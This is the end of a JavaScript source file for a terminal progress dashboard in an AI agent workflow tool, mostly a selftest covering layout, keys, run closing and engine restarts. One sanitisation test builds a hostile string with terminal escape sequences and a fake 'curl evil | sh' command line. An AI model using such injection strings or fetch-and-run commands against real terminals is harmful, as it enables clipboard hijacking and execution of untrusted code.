  assert.strictEqual(bar(50, 10), '█████░░░░░');

  const runs = demoRuns();
  const frame = renderFrame({ runs, index: 0, width: 100, height: 30, color: false });
  const lines = frame.split('\n');
  assert(lines.some(l => l.includes('FEAT-002')), 'runs are listed');
  assert(lines.some(l => l.includes('Analysis')), 'the focused run shows stage detail');
  assert(renderFrame({ runs, index: 0, width: 120, height: 30, color: false }).includes('enter set active'), 'key hints are shown in full when they fit');
  assert(lines.some(l => l.includes('d details')), 'the details key is advertised');

  // What each role does, and what a running one is doing now.
  assert(frame.includes('Threat-model auth'), 'a running role says what it does');
  assert(frame.includes('↳ Read lib/auth/session_store.dart'), 'and what it is doing now');
  const tall = renderFrame({ runs, index: 0, width: 100, height: 60, color: false });
  assert(tall.includes('Derive test cases from acceptance criteria'), 'a tall pane describes every role, not only the running one');
  const short = renderFrame({ runs, index: 0, width: 100, height: 16, color: false });
  assert(short.split('\n').length <= 16, 'descriptions give way before the frame overflows');
  const tighter = renderFrame({ runs, index: 0, width: 100, height: 21, color: false });
  assert(tighter.includes('↳ Read lib/auth/session_store.dart') && !tighter.includes('qa-plan'), 'a short pane keeps the running role and drops the finished ones');
  const tight = renderFrame({ runs, index: 0, width: 100, height: 25, color: false });
  assert(tight.includes('↳ Read lib/auth/session_store.dart') && !tight.includes('Threat-model auth'), 'what a running role is doing outlasts its description');

  // A rejected report: the banner shows the agent's own summary, tests, failed
  // checks and tool side effects, then the other options, then the command.
  const reported = { ...runs[2], needsYou: { ...runs[2].needsYou, kind: 'fail', headline: 'Build + Tests failed', command: 'agentic retry FEAT-011',
    details: { summary: 'All 80 tests pass; pub get rewrote pubspec.lock.', tests: '80 passed, 0 failed', failed: ['flutter analyze — fail: 1 new info lint'], acceptance: ['AC-18: fail: analyzer gate'], sideEffects: [{ file: 'pubspec.lock' }], restored: [] },
    options: [{ label: 'Revert what its tools changed', command: 'git checkout -- pubspec.lock' }, { label: 'Read the full report', command: 'agentic why FEAT-011' }, { label: 'Retry the stage', command: 'agentic retry FEAT-011' }] } };
  const banner = bannerLines(reported, false, 90);
  for (const part of ['All 80 tests pass; pub get rewrote pubspec.lock.', 'Tests: 80 passed', '✗ flutter analyze — fail: 1 new info lint', '! pubspec.lock changed by its tools', '· Read the full report: agentic why FEAT-011']) assert(banner.some(l => l.includes(part)), `the banner shows ${part}`);
  assert.strictEqual(banner.filter(l => l.includes('agentic retry FEAT-011')).length, 1, 'the retry command is shown once, last');
  assert(banner[banner.length - 2].startsWith('→ agentic retry FEAT-011'));

  // d: the details pane, read from the role activity files.
  const toggled = handleKey({ index: 0, count: runs.length }, { name: 'd' });
  assert.strictEqual(toggled.view.details, true);
  assert.strictEqual(handleKey({ ...toggled.view, count: runs.length }, { name: 'escape' }).action, null, 'escape leaves the details first');
  assert.strictEqual(handleKey({ ...toggled.view, count: runs.length }, { name: 'escape' }).view.details, false);
  assert.strictEqual(handleKey({ index: 0, count: 1 }, { name: 'escape' }).action, 'quit', 'escape still quits from the stages');
  const activityRun = { ...runs[0], dir: '/runs/FEAT-002' };
  const seenFiles = [];
  const pane = activityLines(activityRun, 20, false, 70, (file, limit) => { seenFiles.push(file); return [{ t: '2026-11-04T12:00:01.000Z', kind: 'run', text: '$ flutter test test/auth_test.dart' }, { t: '2026-11-04T12:00:05.000Z', kind: 'say', text: 'Session tokens are kept in secure storage.' }].slice(-limit); });
  assert.deepStrictEqual(seenFiles, [path.join('/runs/FEAT-002', 'engine', 'analysis-security.activity.jsonl')], 'each running role is read from its own file');
  assert(pane.some(l => l.startsWith('● security · claude')), 'the running role heads its block');
  assert(pane.some(l => l.includes('Threat-model auth')));
  assert(pane.some(l => /\d\d:\d\d:\d\d  \$ flutter test test\/auth_test\.dart/.test(l)), 'each action with its time');
  const detailFrame = renderFrame({ runs: [activityRun], index: 0, width: 100, height: 30, color: false, details: true });
  assert(detailFrame.includes('what each agent is doing') && detailFrame.includes('d stages'), 'the details pane replaces the stages, and the footer says how back');
  assert(activityLines({ ...runs[2], dir: '' }, 20, false, 70).some(l => l.includes('No agent is running')), 'a run with nothing running says so');
  // A running single-role stage is followed too.
  const stagePane = activityLines({ ...runs[1], dir: '/runs/FEAT-007' }, 20, false, 70, file => { seenFiles.push(file); return []; });
  assert.strictEqual(seenFiles.pop(), path.join('/runs/FEAT-007', 'engine', 'requirements-orchestration.activity.jsonl'));
  assert(stagePane.some(l => l.startsWith('● orchestration')) && stagePane.some(l => l.includes('(no activity recorded yet)')));
  const boxed = lines.filter(l => l.startsWith('│'));
  assert(boxed.length > 5);
  for (const line of boxed) assert.strictEqual(width(line), 100, `box line must be exactly the terminal width: ${JSON.stringify(line)}`);

  // Focus follows the selected index.
  const second = renderFrame({ runs, index: 1, width: 100, height: 30, color: false });
  assert(second.includes('Offline queue for uploads'), 'detail pane follows the selection');

  // Narrow terminals stack the panes instead of splitting.
  const narrow = renderFrame({ runs, index: 0, width: 60, height: 24, color: false });
  for (const line of narrow.split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 60);
  assert(narrow.includes('FEAT-002'));

  // A running stage keeps its specialist roles visible on a normal terminal.
  const normal = renderFrame({ runs, index: 0, width: 96, height: 26, color: false });
  assert(normal.includes('security'), 'roles of the running stage survive compaction');
  assert(renderFrame({ runs, index: 0, width: 96, height: 40, color: false }).includes('Final Verification'), 'a tall terminal shows every stage');

  // An opened pull request shows in the detail head, inside the frame width.
  const withPr = [{ ...runs[0], pullRequest: { provider: 'bitbucket', number: 7762, url: 'https://bitbucket.org/extra-workspace/flutter_project/pull-requests/7762', status: 'open', branch: 'ai/FEAT-002', base: 'master', draft: false } }];
  const prFrame = renderFrame({ runs: withPr, index: 0, width: 100, height: 40, color: false });
  assert(prFrame.includes('Pull request: #7762 https://bitbucket.org/'), 'the PR number and URL are shown');
  assert(prFrame.includes('Pull Request'), 'the stage is listed');
  for (const line of prFrame.split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 100, `box line keeps the frame width: ${JSON.stringify(line)}`);
  const hinted = renderFrame({ runs: [{ ...runs[0], pullRequestHint: 'agentic pr FEAT-002' }], index: 0, width: 100, height: 30, color: false });
  assert(hinted.includes('not opened — run: agentic pr FEAT-002'), 'a skipped PR says how to open it');

  // Short terminals still render inside their row budget.
  for (const height of [12, 16, 24, 40]) {
    const rendered = renderFrame({ runs, index: 0, width: 100, height, color: false });
    assert(rendered.split('\n').length <= height + 1, `frame must fit ${height} rows`);
  }
  // Many runs scroll rather than overflow.
  const many = Array.from({ length: 40 }, (_, i) => ({ ...runs[0], id: `FEAT-${String(i).padStart(3, '0')}` }));
  const scrolled = renderFrame({ runs: many, index: 39, width: 100, height: 20, color: false });
  assert(scrolled.includes('FEAT-039'), 'the selected run stays visible when the list scrolls');
  assert(!scrolled.includes('FEAT-000'), 'far-away runs scroll out of view');

  const empty = renderFrame({ runs: [], index: 0, width: 100, height: 20, color: false });
  assert(empty.includes('No features in progress'), 'empty state explains how to start a run');
  assert(renderFrame({ runs, index: 0, width: 100, height: 30, color: true }).includes('\x1b['), 'color mode emits ANSI');
  assert(!frame.includes('\x1b['), 'color can be disabled');

  // Keys
  const view = { index: 0, count: 3, all: false };
  assert.strictEqual(handleKey(view, { name: 'down' }).view.index, 1);
  assert.strictEqual(handleKey(view, { name: 'up' }).view.index, 2, 'selection wraps');
  assert.strictEqual(handleKey({ ...view, index: 2 }, { name: 'j' }).view.index, 0);
  assert.strictEqual(handleKey(view, { name: 'end' }).view.index, 2);
  assert.strictEqual(handleKey(view, { name: 'return' }).action, 'set-active');
  assert.strictEqual(handleKey(view, { name: 'q' }).action, 'quit');
  assert.strictEqual(handleKey(view, { name: 'c', ctrl: true }).action, 'quit');
  assert.strictEqual(handleKey(view, { name: 'a' }).view.all, true);
  assert.strictEqual(handleKey(view, { name: 'a' }).action, 'reload');
  assert.strictEqual(handleKey(view, { name: 'x' }).action, null);

  // Closing asks first: c arms the prompt, y closes, anything else cancels.
  const armed = handleKey(view, { name: 'c' });
  assert.strictEqual(armed.action, 'close-request');
  assert.strictEqual(armed.view.confirm, true);
  assert.strictEqual(handleKey(armed.view, { name: 'y' }).action, 'close-confirm');
  assert.strictEqual(handleKey(armed.view, { name: 'y' }).view.confirm, false, 'the prompt clears after confirming');
  for (const key of [{ name: 'n' }, { name: 'escape' }, { name: 'return' }, { name: 'q' }, { name: 'down' }]) {
    const cancelled = handleKey(armed.view, key);
    assert.strictEqual(cancelled.action, 'close-cancel', `${key.name} must cancel, not close`);
    assert.strictEqual(cancelled.view.confirm, false);
  }
  assert.strictEqual(handleKey(armed.view, { name: 'c', ctrl: true }).action, 'quit', 'ctrl-c still quits while confirming');
  assert.strictEqual(handleKey({ index: 0, count: 0, all: false }, { name: 'c' }).action, null, 'nothing to close with no runs');

  // Only an unverified run needs admin mode; a verified one closes normally.
  const verifiedRun = { id: 'FEAT-V', percent: 100, phases: [{ id: 'verification', status: 'pass' }] };
  const unverifiedRun = { id: 'FEAT-U', percent: 43, phases: [{ id: 'verification', status: 'pending' }] };
  assert.deepStrictEqual(closeCommand(verifiedRun), { verified: true, admin: false, args: [RUNS_CLI, 'close', 'FEAT-V'] });
  const abandon = closeCommand(unverifiedRun);
  assert.strictEqual(abandon.admin, true);
  assert.deepStrictEqual(abandon.args, [RUNS_CLI, 'close', 'FEAT-U', ABANDON_REASON]);
  assert.match(confirmPrompt(unverifiedRun), /abandoned/);
  assert.match(confirmPrompt(verifiedRun), /verified/);
  assert.strictEqual(confirmPrompt(null), 'Nothing to close.');

  // The prompt replaces the key hints and still fits the frame.
  const confirming = renderFrame({ runs, index: 0, width: 100, height: 24, color: false, confirm: true });
  assert(confirming.includes('y = confirm'), 'the confirmation prompt is shown');
  assert(confirming.includes(runs[0].id));
  assert(!confirming.includes('c close'), 'key hints give way to the prompt');
  for (const line of confirming.split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 100);
  assert(renderFrame({ runs, index: 0, width: 100, height: 24, color: false }).includes('c close'), 'the close key is advertised');
  assert.strictEqual(handleKey({ index: 0, count: 0, all: false }, { name: 'down' }).view.index, 0, 'no runs, no crash');

  // Non-interactive rendering writes one frame and returns it.
  const chunks = [];
  const fake = { isTTY: false, columns: 90, rows: 24, write: c => chunks.push(c), on() {} };
  const result = run({ demo: true, once: true, stdout: fake, color: false });
  assert.strictEqual(chunks.length, 1);
  assert(result.frame.includes('FEAT-002'));

  // A real state root renders without a TTY.
  const temp = fs.mkdtempSync(path.join(os.tmpdir(), 'dashboard-'));
  fs.mkdirSync(path.join(temp, 'FEAT-9'), { recursive: true });
  fs.writeFileSync(path.join(temp, 'FEAT-9', 'state.json'), JSON.stringify({ id: 'FEAT-9', status: 'active', phases: { request: { status: 'pass' } } }));
  const previous = process.env.AI_WORKFLOW_STATE_ROOT;
  process.env.AI_WORKFLOW_STATE_ROOT = temp;
  const live = [];
  run({ once: true, stdout: { isTTY: false, columns: 90, rows: 24, write: c => live.push(c), on() {} }, color: false });
  assert(live.join('').includes('FEAT-9'));
  if (previous === undefined) delete process.env.AI_WORKFLOW_STATE_ROOT; else process.env.AI_WORKFLOW_STATE_ROOT = previous;
  fs.rmSync(temp, { recursive: true, force: true });

  // Closing for real, through runs.js, against a throwaway state root.
  const closeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'dashboard-close-'));
  const seed = (id, verification) => {
    fs.mkdirSync(path.join(closeRoot, id), { recursive: true });
    fs.writeFileSync(path.join(closeRoot, id, 'state.json'), JSON.stringify({
      id, status: 'active', startedAt: new Date().toISOString(),
      phases: { request: { status: 'pass' }, verification: { status: verification } },
      roles: {}, selectedRoles: {},
    }));
  };
  seed('FEAT-VERIFIED', 'pass');
  seed('FEAT-OPEN', 'pending');
  fs.writeFileSync(path.join(closeRoot, '_active'), 'FEAT-OPEN\n');
  const before = process.env.AI_WORKFLOW_STATE_ROOT;
  process.env.AI_WORKFLOW_STATE_ROOT = closeRoot;
  const stateOf = id => JSON.parse(fs.readFileSync(path.join(closeRoot, id, 'state.json'), 'utf8'));

  const done = closeRun({ id: 'FEAT-VERIFIED', percent: 100, phases: [{ id: 'verification', status: 'pass' }] });
  assert.strictEqual(done.ok, true, done.message);
  assert.strictEqual(stateOf('FEAT-VERIFIED').status, 'done');
  assert.strictEqual(stateOf('FEAT-VERIFIED').abandoned, undefined, 'a verified run is closed, not abandoned');

  const abandoned = closeRun({ id: 'FEAT-OPEN', percent: 43, phases: [{ id: 'verification', status: 'pending' }] });
  assert.strictEqual(abandoned.ok, true, abandoned.message);
  assert.match(abandoned.message, /abandoned/);
  const openState = stateOf('FEAT-OPEN');
  assert.strictEqual(openState.status, 'done');
  assert.strictEqual(openState.abandoned, true, 'closing before verification records an abandon');
  assert.strictEqual(openState.closedReason, ABANDON_REASON);
  assert.strictEqual(openState.history.slice(-1)[0].action, 'abandon', 'the run history keeps the reason');
  assert.strictEqual(fs.existsSync(path.join(closeRoot, '_active')), false, 'closing clears the active pointer');
  assert.deepStrictEqual(listRuns({ root: closeRoot }), [], 'closed runs leave the in-progress list');
  assert.strictEqual(listRuns({ root: closeRoot, all: true }).length, 2);

  const missing = closeRun({ id: 'FEAT-GONE', percent: 0, phases: [] });
  assert.strictEqual(missing.ok, false, 'a failed close is reported, not swallowed');
  assert.match(missing.message, /could not close FEAT-GONE/);

  if (before === undefined) delete process.env.AI_WORKFLOW_STATE_ROOT; else process.env.AI_WORKFLOW_STATE_ROOT = before;
  fs.rmSync(closeRoot, { recursive: true, force: true });

  // Needs you: the banner at the top of the selected run, a marker in the list,
  // the new keys in the footer.
  const blockedRun = runs[2];
  assert.ok(blockedRun.needsYou, 'the demo has a run that needs the human');
  const needs = renderFrame({ runs, index: 2, width: 100, height: 34, color: false });
  const needLines = needs.split('\n');
  // The banner wraps; read the detail pane back as running text.
  const detailText = needLines.filter(l => l.startsWith('│')).map(l => l.split('│')[2].trim()).filter(Boolean).join(' ');
  const bannerAt = needLines.findIndex(l => l.includes('⚠ NEEDS YOU · Same failure as last time'));
  assert.ok(bannerAt > 0, needs);
  assert.ok(bannerAt < needLines.findIndex(l => l.includes('✅ Request')), 'the banner sits above the stages');
  assert(detailText.includes('⚠ NEEDS YOU · Same failure as last time — this needs a fix outside Build + Tests'), detailText);
  assert(detailText.includes('2 widget tests fail in test/rtl_layout_test.dart (expected TextDirection.rtl)'), 'the reason is shown');
  assert(detailText.includes(`→ ${blockedRun.needsYou.command}`), 'the exact command is shown, whole');
  assert(needLines.some(l => /⚠ FEAT-011/.test(l)), 'the list marks the run that needs you');
  assert(!needLines.some(l => /⚠ FEAT-002|⚠ FEAT-007/.test(l)), 'only that run');
  assert(needs.includes('R resume · T retry'), 'the footer lists the new keys');
  for (const line of needLines.filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 100, `banner lines keep the frame width: ${JSON.stringify(line)}`);
  for (const line of renderFrame({ runs, index: 2, width: 60, height: 30, color: false }).split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 60);
  // A running engine: its own marker and line, no needs-you banner.
  const running = [{ ...blockedRun, engine: { pid: 4242, kind: 'engine', command: 'resume', startedAt: null, host: os.hostname() } }];
  const runningFrame = renderFrame({ runs: running, index: 0, width: 100, height: 30, color: false });
  assert(runningFrame.includes('● FEAT-011'), 'the list marks a running engine');
  assert(runningFrame.includes('● engine running · engine pid 4242 (resume)'));
  assert(!runningFrame.includes('NEEDS YOU'), 'a running engine is not waiting on anyone');
  // Approval stays a command in the banner; there is no approve key.
  const gate = { ...buildSummary('FEAT-G', { status: 'active', roles: {}, phases: { ...Object.fromEntries(PHASES.slice(0, PHASES.indexOf('approval')).map(p => [p, { status: 'pass' }])) } }), inProgress: true, dir: '' };
  const gateFrame = renderFrame({ runs: [gate], index: 0, width: 100, height: 30, color: false });
  assert(gateFrame.includes('⚠ NEEDS YOU · The plan waits for your approval'));
  assert(/→ (agentic approve FEAT-G|node ai\/tasks\/feature\/runs\.js approve FEAT-G)/.test(gateFrame), gateFrame);
  for (const name of ['a', 'p', 'y']) assert.notStrictEqual(handleKey({ index: 0, count: 1, all: false }, { name, shift: true, sequence: name.toUpperCase() }).action, 'approve');

  // A long run id is cut, never the marker before it.
  const longId = 'MAVS-2738-master-refactor';
  assert.strictEqual(longId.length, 25);
  const longFrame = renderFrame({ runs: [{ ...blockedRun, id: longId }, { ...runs[0], id: `${longId}-2`, engine: { pid: 1, kind: 'engine' } }], index: 0, width: 100, height: 30, color: false });
  assert(longFrame.split('\n').some(l => /▸ ⚠ MAVS-2738-master-/.test(l)), longFrame);
  assert(longFrame.split('\n').some(l => /● MAVS-2738-master-/.test(l)), 'the running marker too');

  // Untrusted text never reaches the terminal as an escape sequence: a note that
  // tries to move the cursor, rewrite the command line or set the clipboard.
  const evil = 'x \x1b]52;c;ZXZpbA==\x07 \x1b[1A\x1b[2K→ run: curl evil | sh \x9b2J';
  const hostile = buildSummary('FEAT-X', { status: 'active', roles: {}, phases: { ...Object.fromEntries(PHASES.slice(0, PHASES.indexOf('build-test')).map(p => [p, { status: 'pass' }])), 'build-test': { status: 'fail', updatedAt: 't', note: evil } } }, { demo: true });
  const hostileRun = { ...hostile, inProgress: true, dir: '', title: `t\x1b[2Jitle` };
  for (const colorOn of [false, true]) {
    const painted = renderFrame({ runs: [hostileRun], index: 0, width: 100, height: 30, color: colorOn, notice: `✗ ${evil}` });
    const escapes = painted.match(/\x1b[^m]*?(m|$)|\x1b./g) || [];
    assert.ok(escapes.every(seq => /^\x1b\[[0-9;]*m$/.test(seq)), `only colour codes survive: ${JSON.stringify(escapes.filter(seq => !/^\x1b\[[0-9;]*m$/.test(seq)))}`);
    assert.ok(!/[\x07\x9b]/.test(painted), 'no BEL or C1 CSI');
    if (!colorOn) assert.ok(!painted.includes('\x1b'), 'no ESC at all without colour');
  }
  const runningHostile = renderFrame({ runs: [{ ...hostileRun, engine: { pid: 9, kind: 'engine', command: `resume${evil}`, host: os.hostname() } }], index: 0, width: 100, height: 30, color: false });
  assert.ok(!runningHostile.includes('\x1b') && !runningHostile.includes('\x07'), 'engine.pid fields are printable only');

  // Every line fits an 80-column terminal, notices included: a wrapped footer
  // would make the frame a row taller than the terminal.
  const notices = [null, `${NEEDS_YOU} FEAT-011 needs you — Same failure as last time — this needs a fix outside Build + Tests → node ai/tasks/feature/runs.js retry FEAT-011 && node ai/workflow/engine.js resume FEAT-011`, '▸ resuming FEAT-011… engine pid 31337 · log /Users/someone/projects/app/.agentic-runs/FEAT-011/engine/background.log'];
  for (const cols of [80, 60, 40]) {
    for (const all of [false, true]) {
      for (const notice of notices) {
        for (const confirm of [false, true]) {
          const fitted = renderFrame({ runs, index: 2, width: cols, height: 24, color: false, all, notice, confirm });
          for (const line of fitted.split('\n')) assert.ok(width(line) <= cols, `${cols} columns: ${width(line)} ${JSON.stringify(line)}`);
        }
      }
    }
    assert.ok(renderFrame({ runs: [], index: 0, width: cols, height: 20, color: false }).split('\n').every(line => width(line) <= cols));
  }
  assert(renderFrame({ runs, index: 0, width: 80, height: 24, color: false }).includes('R resume · T retry'), 'a narrow footer still names R and T');

  // R / T: shifted keys; plain r stays refresh.
  assert.strictEqual(handleKey(view, { name: 'r', shift: true, sequence: 'R' }).action, 'resume');
  assert.strictEqual(handleKey(view, { name: 't', shift: true, sequence: 'T' }).action, 'retry');
  assert.strictEqual(handleKey(view, { name: 'r', sequence: 'r' }).action, 'reload');
  assert.strictEqual(handleKey(view, { name: 't', sequence: 't' }).action, null);
  assert.strictEqual(handleKey({ index: 0, count: 0, all: false }, { name: 'r', shift: true, sequence: 'R' }).action, null, 'nothing to resume with no runs');

  // The bell: new needs-you keys and completions ring once; what was already
  // there when the terminal opened does not.
  const seenKeys = new Set();
  assert.deepStrictEqual(newAttention(seenKeys, runs, true), [], 'opening the terminal rings nothing');
  assert.deepStrictEqual(newAttention(seenKeys, runs), [], 'nothing new, no bell');
  const later = runs.map(r => (r.id === 'FEAT-007' ? { ...r, needsYou: { ...blockedRun.needsYou, key: 'FEAT-007|build-test|fail|t9', headline: 'Build + Tests failed' } } : r));
  const rung = newAttention(seenKeys, later);
  assert.deepStrictEqual(rung.map(e => e.id), ['FEAT-007']);
  assert.match(rung[0].message, /^⚠ FEAT-007 needs you — Build \+ Tests failed → /);
  assert.deepStrictEqual(newAttention(seenKeys, later), [], 'each event rings once');
  const finished = [{ ...runs[1], current: 'Done', needsYou: null, completedAt: 'c1', pullRequest: { number: 9, url: 'https://x/pr/9' } }];
  assert.match(newAttention(seenKeys, finished)[0].message, /^✔ FEAT-007 complete · pull request #9 https:\/\/x\/pr\/9$/);
  assert.deepStrictEqual(newAttention(seenKeys, finished), [], 'a completion rings once');
  // Reworked and complete again: a new completion time, so it rings again, with
  // the same key the engine's desktop notification uses.
  const again = [{ ...finished[0], completedAt: 'c2', pullRequest: null }];
  const rungAgain = newAttention(seenKeys, again);
  assert.deepStrictEqual(rungAgain.map(e => [e.id, e.key]), [['FEAT-007', notify.completeEvent('FEAT-007', { phases: { 'pull-request': { status: 'skipped', updatedAt: 'c2' } } }).key]]);

  // startEngine: refuses while an engine is alive; otherwise starts a detached
  // engine with no shell, its output in the run's engine/background.log.
  const startRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'dashboard-start-'));
  try {
    const runDir = path.join(startRoot, 'FEAT-R');
    fs.mkdirSync(path.join(runDir, 'engine'), { recursive: true });
    const target = { id: 'FEAT-R', dir: runDir, inProgress: true };
    const calls = [];
    const fakeSpawn = (file, args, opts) => { calls.push({ file, args, opts }); return { pid: 31337, on() {}, unref() {} }; };
    const refused = startEngine(target, 'resume', { spawnFn: fakeSpawn, live: () => ({ pid: 777, kind: 'engine', command: 'resume' }), cwd: startRoot });
    assert.strictEqual(refused.ok, false);
    assert.match(refused.message, /^✗ FEAT-R is already running \(engine pid 777 \(resume\)\); not starting a second engine$/);
    assert.strictEqual(calls.length, 0, 'nothing started while an engine is alive');
    assert.match(startEngine({ ...target, inProgress: false }, 'resume', { spawnFn: fakeSpawn, live: () => null }).message, /is closed/);
    // R on a stopped stage or a waiting gate starts nothing and says what to do.
    const stuck = { ...target, needsYou: { kind: 'fail', stage: 'build-test', label: 'Build + Tests', command: 'agentic retry FEAT-R' } };
    assert.deepStrictEqual(startEngine(stuck, 'resume', { spawnFn: fakeSpawn, live: () => null, cwd: startRoot }), { ok: false, message: '✗ FEAT-R: Build + Tests needs a retry first — press T (or run: agentic retry FEAT-R)' });
    assert.deepStrictEqual(startEngine({ ...target, needsYou: { ...stuck.needsYou, kind: 'blocked', stage: 'verification', label: 'Final Verification' } }, 'resume', { spawnFn: fakeSpawn, live: () => null }).message, '✗ FEAT-R: Final Verification needs a retry first — press T (or run: agentic retry FEAT-R)');
    assert.deepStrictEqual(startEngine({ ...target, needsYou: { kind: 'waiting', stage: 'approval', label: 'Human Approval', command: 'agentic approve FEAT-R' } }, 'resume', { spawnFn: fakeSpawn, live: () => null }), { ok: false, message: '✗ FEAT-R waits for you — run: agentic approve FEAT-R' });
    assert.strictEqual(calls.length, 0, 'nothing started for either');
    // A blocked pull-request stage is continued by a resume; T still retries a failed stage.
    const prResume = startEngine({ ...target, needsYou: { kind: 'blocked', stage: 'pull-request', label: 'Pull Request', command: 'agentic resume FEAT-R' } }, 'resume', { spawnFn: fakeSpawn, live: () => null, cwd: startRoot });
    assert.strictEqual(prResume.ok, true, prResume.message);
    const retryStuck = startEngine(stuck, 'retry', { spawnFn: fakeSpawn, live: () => null, spawnSyncFn: () => ({ status: 0, stdout: '', stderr: '' }), cwd: startRoot });
    assert.strictEqual(retryStuck.ok, true, retryStuck.message);
    calls.length = 0;
    const started = startEngine(target, 'resume', { spawnFn: fakeSpawn, live: () => null, engine: '/runtime/engine.js', cwd: startRoot, env: { X: '1' } });
    assert.strictEqual(started.ok, true, started.message);
    assert.match(started.message, /^▸ resuming FEAT-R… engine pid 31337 · log FEAT-R\/engine\/background\.log$/);
    assert.deepStrictEqual([calls[0].file, calls[0].args], [process.execPath, ['/runtime/engine.js', 'resume', 'FEAT-R']]);
    assert.deepStrictEqual([calls[0].opts.shell, calls[0].opts.detached, calls[0].opts.cwd, calls[0].opts.env], [false, true, startRoot, { X: '1' }]);
    assert.strictEqual(calls[0].opts.stdio[0], 'ignore');
    assert.ok(Number.isInteger(calls[0].opts.stdio[1]) && calls[0].opts.stdio[1] === calls[0].opts.stdio[2], 'stdout and stderr go to the log file');
    assert.match(fs.readFileSync(path.join(runDir, 'engine', 'background.log'), 'utf8'), /resume started from agentic progress/);
    // T: retry first; a refused retry starts nothing and says why.
    const syncCalls = [];
    const noRetry = startEngine(target, 'retry', { spawnFn: fakeSpawn, live: () => null, runsCli: '/runtime/runs.js', spawnSyncFn: (file, args) => { syncCalls.push(args); return { status: 1, stdout: '', stderr: '✗ nothing to retry; run agentic resume FEAT-R\n' }; } });
    assert.deepStrictEqual([noRetry.ok, noRetry.message], [false, '✗ FEAT-R: nothing to retry; run agentic resume FEAT-R']);
    assert.deepStrictEqual(syncCalls[0], ['/runtime/runs.js', 'retry', 'FEAT-R']);
    assert.strictEqual(calls.length, 1);
    const retried = startEngine(target, 'retry', { spawnFn: fakeSpawn, live: () => null, spawnSyncFn: () => ({ status: 0, stdout: 'FEAT-R: retried build-test\n', stderr: '' }), cwd: startRoot });
    assert.match(retried.message, /^▸ retrying FEAT-R… engine pid 31337/);
    assert.strictEqual(calls.length, 2);

    // For real: a stand-in engine runs detached and writes to the log; a live
    // engine.pid (this process) makes the default liveness check refuse.
    const stubEngine = path.join(startRoot, 'stub-engine.js');
    fs.writeFileSync(stubEngine, "require('fs').writeFileSync(process.argv[3] + '.ran', process.argv.slice(2).join(' ')); console.log('stub engine output');\n");
    const real = startEngine({ ...target, id: path.join(startRoot, 'marker') }, 'resume', { engine: stubEngine, cwd: startRoot, live: () => null });
    assert.strictEqual(real.ok, true, real.message);
    for (const until = Date.now() + 5000; !fs.existsSync(path.join(startRoot, 'marker.ran')) && Date.now() < until;) Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 25);
    assert.strictEqual(fs.readFileSync(path.join(startRoot, 'marker.ran'), 'utf8'), `resume ${path.join(startRoot, 'marker')}`, 'the stand-in engine ran with the resume arguments');
    for (const until = Date.now() + 5000; !/stub engine output/.test(fs.readFileSync(real.log, 'utf8')) && Date.now() < until;) Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 25);
    assert.match(fs.readFileSync(real.log, 'utf8'), /stub engine output/, 'its output lands in the log');
    fs.writeFileSync(path.join(runDir, 'engine', 'engine.pid'), JSON.stringify({ pid: process.pid, host: os.hostname(), command: 'resume', startedAt: new Date().toISOString() }));
    const alive = startEngine(target, 'resume', { engine: stubEngine, cwd: startRoot });
    assert.strictEqual(alive.ok, false);
    assert.match(alive.message, new RegExp(`already running \\(engine pid ${process.pid} \\(resume\\)`));
  } finally { fs.rmSync(startRoot, { recursive: true, force: true }); }

  console.log('dashboard selftest OK');
}

function parseArgs(argv) {
  const options = { all: false, demo: false, once: false, run: null, interval: 1000 };
  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];
    if (arg === '--all') options.all = true;
    else if (arg === '--demo') options.demo = true;
    else if (arg === '--once') options.once = true;
    else if (arg === '--details') options.details = true;
    else if (arg === '--color') options.color = true;
    else if (arg === '--no-color') options.color = false;
    else if (arg === '--run') options.run = argv[++i];
    else if (arg === '--interval') options.interval = Math.max(250, Number(argv[++i]) || 1000);
    else if (!arg.startsWith('--') && !options.run) options.run = arg;
  }
  return options;
}

if (require.main === module) {
  if (process.argv.includes('--selftest')) selftest();
  else run(parseArgs(process.argv.slice(2)));
}

module.exports = { width, pad, truncate, safe, bar, listLines, bannerLines, detailLines, activityLines, renderFrame, handleKey, isVerified, closeCommand, confirmPrompt, closeRun, startEngine, newAttention, demoRuns, run, parseArgs };
